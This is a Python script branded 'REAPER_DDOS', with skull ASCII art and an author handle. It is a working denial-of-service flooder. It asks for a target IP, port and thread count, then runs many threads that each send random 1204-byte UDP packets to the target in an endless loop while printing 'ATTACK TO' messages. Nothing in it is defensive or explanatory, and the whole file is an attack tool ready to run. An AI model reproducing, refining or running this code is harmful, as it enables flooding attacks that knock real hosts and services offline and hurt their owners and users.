import random
import socket
import threading
print("         |----REAPER_DDOS----|")
print("|----BOOTING UP THE DEATH MACHINE----|")
print("         |----BJW333#7283----|")
print("               ;::::;  ")
print("               ;::::;")
print("             ;::::; :;")
print("            ;:::::   :;")
print("          ;:::::;     ;.")
print("          ,:::::       ;           DDO")
print("         ::::::;       ;          SDDOSD")
print("         ;:::::;       ;         DOSDDOSD")
print("        ,;::::::;     ;          / DOSDDOS")
print("      ;::::::::::. ,,,;.        /  / DDOSDDo")
print("    .:;:::::::::::::::::;,     /  /     DDOSD")
print("   ,::::::;::::::;;;;::::;,   /  /        DDOS")
print("  ;:::::::::::::::;;;::::: ,:/  /          DDOS")
print("  ::::::::::;::::::;;::: ;:::  /            DDOS")
print("  :::::::::::;:::::::: ;::::: /              DDO")
print("  :::::::::::;:::::: ;:::::::/                SDD")
print("   ::::::::::::;; ;:::::::::::                 OS")
print("   :::::::::::::;::::::::;::::                  DD")
print("   :::::::::::::::::::;:::;:::                   O")
print("    :::::::::::::::;: /  / :::")   
print("     ::::::::::::;:  /  /   : ")

print("|=====================================================================================================================|")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
threads = int(input("PING:"))
def run():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			ad = (str(ip),int(port))
			for x in range(1):
				s.sendto(data, ad)
				
			print("[+] ATTACK TO", ip, port, "PING EXPORT =", threads)
			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()
